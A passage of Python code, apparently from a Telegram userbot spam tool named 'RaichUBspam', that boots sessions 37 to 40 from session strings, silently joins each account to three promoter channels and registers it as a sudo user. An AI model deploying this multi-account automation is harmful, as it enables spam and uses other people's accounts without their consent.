        except Exception as e:
            pass
   
    if STRING37:
        session_name = str(STRING37)
        print("String 37 Found")
        Sex37 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 37")
            await Sex37.start()
            botme = await Sex37.get_me()
            await Sex37(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex37(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex37(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 37 not Found")
        session_name = "RaichUBspam"
        Sex37 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex37.start()
        except Exception as e:
            pass
   
    if STRING38:
        session_name = str(STRING38)
        print("String 38 Found")
        Sex38 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 38")
            await Sex38.start()
            botme = await Sex38.get_me()
            await Sex38(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex38(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex38(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 38 not Found")
        session_name = "RaichUBspam"
        Sex38 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex38.start()
        except Exception as e:
            pass
   
    if STRING39:
        session_name = str(STRING39)
        print("String 39 Found")
        Sex39 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 39")
            await Sex39.start()
            botme = await Sex39.get_me()
            await Sex39(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex39(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex39(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 39 not Found")
        session_name = "RaichUBspam"
        Sex39 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex39.start()
        except Exception as e:
            pass
   
    if STRING40:
        session_name = str(STRING40)
        print("String 40 Found")
        Sex40 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 40")
            await Sex40.start()
            botme = await Sex40.get_me()
            await Sex40(functions.channels.JoinChannelRequest(channel="@TGNOfficialBots"))
            await Sex40(functions.channels.JoinChannelRequest(channel="@GURATEGANG"))
            await Sex40(functions.channels.JoinChannelRequest(channel="@TGNBots"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 40 not Found")
        session_name = "RaichUBspam"
        Sex40 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Sex40.start()
        except Exception as e:
            pass

loop = asyncio.get_event_loop()
loop.run_until_complete(RaichUB())
